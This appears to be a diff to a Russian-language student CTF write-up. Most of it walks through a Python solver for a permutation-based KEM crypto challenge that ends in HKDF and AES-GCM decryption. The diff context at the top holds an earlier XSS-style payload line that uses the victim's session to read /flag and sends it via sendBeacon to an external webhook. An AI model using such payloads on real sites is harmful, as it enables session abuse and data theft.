@@ -129,3 +129,501 @@ avigator.sendBeacon(webhookUrl, 'flag=' + encodeURIComponent(flag));
 2. Просит браузер жертвы прочитать скрытый ресурс /flag, пользуясь его действующей сессией.
 
 3. Пересылает прочитанный флаг на мой внешний адрес в удобном для анализа виде (JSON).
+
+
+
+
+## Утилита на Python для расшифровки Permutation-KEM
+### 1. Контекст задачи
+
+В отчёте по задаче №3 (PwnSec CTF 2025) одногруппник разбирает криптозадачу со схемой в стиле Rubik-KEM / Permutation-KEM.
+
+Нам выдают архив с файлами, в том числе handout.json, где лежат:
+
+- публичные слои ```pub.layers``` — в каждом слое набор генераторов ```gens```, то есть перестановок;
+
+- «засоленный» шифртекст ```kem.cipher``` — список перестановок, искажённых с помощью секретных перестановок;
+
+- параметры соли ```params.salt``` — для каждого слоя своя пара ```(J, d)```;
+
+- матрица смешивания ```A``` и модуль ```M``` в ```params.mix``` — для линейного преобразования вектора экспонент;
+
+- объект ```sealed_flag``` — зашифрованный флаг, который шифруется по схеме AES-GCM с ключом, полученным из вектора экспонент через HKDF. 
+
+### 2. Сам скрипт
+
+В отчёте приводится большой скрипт на Python. Условно его можно разбить на части:
+
+- импорт библиотек и тип Perm;
+
+- набор функций для работы с перестановками;
+
+- функции для работы с циклами, НОК и обратным элементом;
+
+- функция умножения матрицы на вектор по модулю;
+
+- главная функция main(), которая всё связывает.
+
+Сокращённо, общий вид скрипта такой:
+```import json
+import math
+from typing import List, Tuple
+from base64 import b64decode
+
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+Perm = Tuple[int, ...]
+
+def compose(p: Perm, q: Perm) -> Perm:
+    ...
+
+def inverse(p: Perm) -> Perm:
+    ...
+
+def identity(n: int) -> Perm:
+    ...
+
+def pow_perm(p: Perm, e: int) -> Perm:
+    ...
+
+def perm_to_cycles(p: Perm) -> List[List[int]]:
+    ...
+
+def lcm_many(vals: List[int]) -> int:
+    ...
+
+def egcd(a, b):
+    ...
+
+def modinv(a: int, m: int) -> int:
+    ...
+
+def recover_r_from_Jd(J: Perm, d: int) -> Perm:
+    ...
+
+def deserialize_perm(obj) -> Perm:
+    ...
+
+def find_exponent_for_generator(g: Perm, target: Perm, ord_g: int) -> int:
+    ...
+
+def mat_vec_mul_mod(A: List[List[int]], x: List[int], mod: int) -> List[int]:
+    ...
+
+def main():
+    with open("handout.json", "r") as f:
+        H = json.load(f)
+
+    pub_layers = H["pub"]["layers"]
+    ciphertext = H["kem"]["cipher"]
+    salt_meta = H["params"]["salt"]
+    gen_order = H["kem"]["gen_order"]
+    mix = H["params"]["mix"]
+    M = int(mix["M"])
+    A = mix["A"]
+    sealed = H["sealed_flag"]
+
+    # 1. Снять соль
+    unsalted = []
+    for C_salted_obj, meta in zip(ciphertext, salt_meta):
+        J = tuple(meta["J"])
+        d = int(meta["d"])
+        r = recover_r_from_Jd(J, d)
+        r_inv = inverse(r)
+        C = compose(r, compose(tuple(C_salted_obj), r_inv))
+        unsalted.append(C)
+
+    # 2. Восстановить вектор экспонент
+    exps: List[int] = []
+    for Lpub, C in zip(pub_layers, unsalted):
+        gens_map = {nm: tuple(p) for nm, p in Lpub["gens"].items()}
+        orders_map = Lpub.get("meta", {}).get("orders", {})
+        for nm in gen_order:
+            g = gens_map[nm]
+            ord_nm = int(orders_map.get(nm, 24))
+            e = find_exponent_for_generator(g, C, ord_nm)
+            exps.append(e)
+
+    # 3. Применить матрицу смешивания
+    e_prime = mat_vec_mul_mod(A, exps, M)
+    raw = bytes(e_prime)
+
+    # 4. Получить ключ через HKDF и расшифровать AES-GCM
+    hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b"Rubik-KEM-v2")
+    key = hkdf.derive(raw)
+
+    nonce = b64decode(sealed["nonce"])
+    ct = b64decode(sealed["ct"])
+    aad = b"Rubik-CTF-v2"
+    pt = AESGCM(key).decrypt(nonce, ct, aad)
+
+    print("Recovered plaintext (flag):")
+    print(pt.decode("utf-8"))
+
+if __name__ == "__main__":
+    main()
+```
+
+### 3. Подробный разбор кода
+#### 3.1. Тип Perm и базовые операции над перестановками
+
+В начале задаётся тип:
+```
+Perm = Tuple[int, ...]
+```
+
+То есть одна перестановка — это просто кортеж чисел, где по индексу ```i``` лежит образ элемента ```i``` после применения перестановки.
+
+Дальше идут основные строительные блоки:
+
+```
+def compose(p: Perm, q: Perm) -> Perm:
+    if len(p) != len(q):
+        raise ValueError("len mismatch")
+    return tuple(p[i] for i in q)
+```
+
+Здесь реализовано составление двух перестановок: сначала применяется ```q```, потом ```p```. Для элемента с индексом ```i``` сначала берётся ```q[i]```, а потом к результату применяется ```p```.
+
+```
+def inverse(p: Perm) -> Perm:
+    inv = [0] * len(p)
+    for i, j in enumerate(p):
+        inv[j] = i
+    return tuple(inv)
+```
+
+Эта функция строит обратную перестановку: для каждого ```j = p[i]``` мы говорим, что в обратной перестановке на месте ```j``` будет стоять ```i```.
+
+```
+def identity(n: int) -> Perm:
+    return tuple(range(n))
+```
+Это единичная перестановка, которая ничего не меняет.
+
+```
+def pow_perm(p: Perm, e: int) -> Perm:
+    if e < 0:
+        raise ValueError("negative exp")
+    n = len(p)
+    out = list(range(n))
+    def compose_list(a, b):
+        return [a[i] for i in b]
+    base = list(p)
+    res = list(range(n))
+    ee = e
+    while ee:
+        if ee & 1:
+            res = compose_list(base, res)
+        base = compose_list(base, base)
+        ee >>= 1
+    return tuple(res)
+```
+
+Здесь реализовано возведение перестановки в степень. Используется метод повторного возведения в квадрат (как для чисел), только вместо умножения — составление перестановок.
+
+Для меня как студента это важно: дальше по коду мы будем много раз поднимать перестановки в степень, и без отдельной функции это было бы неудобно.
+
+#### 3.2 Работа с циклами перестановки, НОК и обратным элементом
+
+Теперь нужна математика, чтобы «развернуть» соль.
+
+Сначала перестановка разбивается на циклы:
+
+```
+def perm_to_cycles(p: Perm) -> List[List[int]]:
+    n = len(p)
+    seen = [False] * n
+    cycles = []
+    for i in range(n):
+        if seen[i] or p[i] == i:
+            continue
+        cur = i
+        cyc = []
+        while not seen[cur]:
+            seen[cur] = True
+            cyc.append(cur)
+            cur = p[cur]
+        if cyc:
+            cycles.append(cyc)
+    return cycles
+```
+
+Здесь:
+
+- я иду по всем позициям;
+
+- если элемент сам в себя переходит (p[i] == i), это неинтересно;
+
+- иначе «обхожу» цикл, пока не вернусь в исходную точку;
+
+- собираю такие циклы в список.
+
+Дальше нужен НОК длин циклов:
+```
+def lcm_many(vals: List[int]) -> int:
+    L = 1
+    for v in vals:
+        L = (L * v) // math.gcd(L, v)
+    return L
+```
+Это обычное вычисление наименьшего общего кратного: для длин всех циклов перестановки.
+
+Потом — расширенный алгоритм Евклида и обратный элемент по модулю:
+
+```
+def egcd(a, b):
+    if b == 0:
+        return (1, 0, a)
+    x1, y1, g = egcd(b, a % b)
+    return (y1, x1 - (a // b) * y1, g)
+
+def modinv(a: int, m: int) -> int:
+    a %= m
+    x, y, g = egcd(a, m)
+    if g != 1:
+        raise ValueError("no inverse")
+    return x % m
+```
+Здесь ```modinv(a, m)``` вычисляет такое число ```x```, что ```a * x ≡ 1 (mod m)```.
+
+Все эти функции используются в важной части — восстановление перестановки r из параметров (J, d):
+
+```
+def recover_r_from_Jd(J: Perm, d: int) -> Perm:
+    cyc = perm_to_cycles(J)
+    if not cyc:
+        return identity(len(J))
+    L = lcm_many([len(c) for c in cyc])
+    d_inv = modinv(d % L, L)
+    return pow_perm(J, d_inv)
+```
+
+Как я это понимаю:
+
+- J — это перестановка, связанная с солью;
+
+- d — параметр, который задает, как J использовалась при засолке;
+
+- циклы J определяют её период (через НОК длин);
+
+- мы находим обратный элемент d⁻¹ по модулю этого периода;
+
+- поднимаем J в степень d⁻¹ и получаем перестановку r, которая нужна, чтобы снять соль.
+
+#### 3.3. Снятие соли с шифртекста
+
+В ```main()``` это выглядит так:
+```
+unsalted = []
+for C_salted_obj, meta in zip(ciphertext, salt_meta):
+    C_salted = tuple(C_salted_obj)
+    J = tuple(meta["J"])
+    d = int(meta["d"])
+    r = recover_r_from_Jd(J, d)
+    r_inv = inverse(r)
+    C = compose(r, compose(C_salted, r_inv))
+    unsalted.append(C)
+```
+
+Здесь:
+
+- ```C_salted``` — слой шифртекста с солью;
+
+- ```J```, ```d``` — параметры соли для этого слоя;
+
+сначала я восстанавливаю ```r = J^{d⁻¹}``` (через ```recover_r_from_Jd```);
+
+потом считаю ```r⁻¹``` через inverse;
+
+затем снимаю соль по формуле ```C = r * C_salted * r⁻¹```.
+
+В итоге в списке ```unsalted``` лежат уже «чистые» слои шифртекста, без примешанной соли.
+
+#### 3.4. Восстановление экспонент по генераторам
+
+Теперь нужно из «чистых» перестановок достать сами экспоненты (степени генераторов), которые в конце концов и будут превращены в байты.
+
+Функция для этого:
+
+```
+def find_exponent_for_generator(g: Perm, target: Perm, ord_g: int) -> int:
+    n = len(g)
+    moved = [i for i in range(n) if g[i] != i]
+    for t in range(ord_g):
+        gp = pow_perm(g, t)
+        ok = True
+        for i in moved:
+            if gp[i] != target[i]:
+                ok = False
+                break
+        if ok:
+            return t
+    raise ValueError("exponent not found for generator (ord {})".format(ord_g))
+```
+Как я это вижу:
+
+- ```g``` — один из генераторов в слое (публичная перестановка);
+
+- ```target``` — тот слой шифртекста, из которого мы хотим вытащить, какая степень ```g``` была использована;
+
+- ```ord_g``` — порядок генератора (на сколько шагов он возвращается к исходному состоянию).
+
+Алгоритм:
+
+1. Находим все позиции, которые ```g``` реально трогает (moved).
+
+2. Перебираем степени ```t``` от 0 до ```ord_g - 1```.
+
+3. Для каждой степени считаем ```gp = g^t```.
+
+4. Сравниваем на затронутых позициях ```gp``` и ```target```.
+
+Если везде совпало — мы нашли нужную степень ```t```.
+
+В ```main()``` это применяется так:
+
+```
+exps: List[int] = []
+for Lpub, C in zip(pub_layers, unsalted):
+    gens_map = {nm: tuple(p) for nm, p in Lpub["gens"].items()}
+    orders_map = Lpub.get("meta", {}).get("orders", {})
+    for nm in gen_order:
+        g = gens_map[nm]
+        ord_nm = int(orders_map.get(nm, 24))
+        e = find_exponent_for_generator(g, C, ord_nm)
+        exps.append(e)
+```
+
+Таким образом, строится длинный список ```exps``` — это и есть вектор всех экспонент, скрытых внутри перестановочной конструкции.
+
+
+#### 3.5. Применение матрицы смешивания и перевод в байты
+
+Следующий шаг — умножить вектор экспонент на заданную матрицу ```A``` по модулю ```M```:
+
+```
+def mat_vec_mul_mod(A: List[List[int]], x: List[int], mod: int) -> List[int]:
+    n, m = len(A), len(A[0])
+    assert m == len(x)
+    out = [0] * n
+    for i in range(n):
+        s = 0
+        Ai = A[i]
+        for j in range(m):
+            s = (s + (Ai[j] % mod) * (x[j] % mod)) % mod
+        out[i] = s
+    return out
+```
+Фактически это обычное умножение матрицы на вектор, только все операции делаются по модулю ```mod```.
+
+В ```main()```:
+
+```
+e_prime = mat_vec_mul_mod(A, exps, M)
+raw = bytes(e_prime)
+```
+
+То есть:
+
+- ```e_prime``` — новый вектор чисел после линейного преобразования;
+
+- ```raw``` — те же числа, но уже напрямую переведённые в байтовую строку, которая и послужит исходным материалом для ключа.
+
+#### 3.6 Получение ключа через HKDF и расшифровка AES-GCM
+
+Заключительный этап — превратить ```raw``` в ключ для симметричного шифрования и расшифровать флаг.
+
+```
+hkdf = HKDF(
+    algorithm=hashes.SHA256(),
+    length=32,
+    salt=None,
+    info=b"Rubik-KEM-v2"
+)
+key = hkdf.derive(raw)
+```
+
+Здесь:
+
+- используется стандартный механизм HKDF на основе SHA-256;
+
+- на вход подаётся raw (байтовая строка из экспонент);
+
+- на выходе — 32 байта ключа key.
+
+Потом:
+```
+nonce = b64decode(sealed["nonce"])
+ct = b64decode(sealed["ct"])
+aad = b"Rubik-CTF-v2"
+
+pt = AESGCM(key).decrypt(nonce, ct, aad)
+print("Recovered plaintext (flag):")
+print(pt.decode("utf-8"))
+```
+
+Здесь:
+
+- ```nonce``` и ```ct``` берутся из ```sealed_flag``` и раскодируются из base64;
+
+- ```aad``` — дополнительная строка, которая участвует в проверке целостности;
+
+- вызывается ```decrypt```, и мы получаем расшифрованный флаг ```pt```;
+
+- дальше флаг выводится как текст.
+
+Если бы где-то по пути мы ошиблись (неправильно сняли соль, неправильно нашли экспоненты и т.п.), то ```AESGCM.decrypt``` просто выдал бы ошибку, и флаг получить бы не удалось.
+
+### 4. Итог и значение утилиты
+
+Что делает данный скрипт:
+
+1. Снимает соль с шифртекста, используя параметры ```(J, d)``` и математические функции (циклы, НОК, обратный элемент по модулю).
+
+2. Восстанавливает экспоненты по слоям, перебирая степени генераторов и сравнивая только те позиции, где генератор что-то изменяет.
+
+3. Применяет матрицу смешивания, превращая вектор экспонент в новый вектор байтов.
+
+4. Через HKDF получает ключ и расшифровывает флаг в режиме AES-GCM.
+
+За счёт такого подхода видно сразу несколько важных моментов:
+
+- как из чисто алгебраической конструкции (перестановки) можно извлечь скрытый числовой секрет;
+
+- как аккуратно использовать математические функции (НОК, обратный элемент) в прикладном коде;
+
+- как связать эту алгебру с современными схемами шифрования (HKDF + AES-GCM).
+
+То есть по сути это утилита, которая автоматизирует весь путь от JSON с перестановками до готового флага, и по ней удобно учиться связывать теорию групп и практическую криптографию в одном скрипте.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
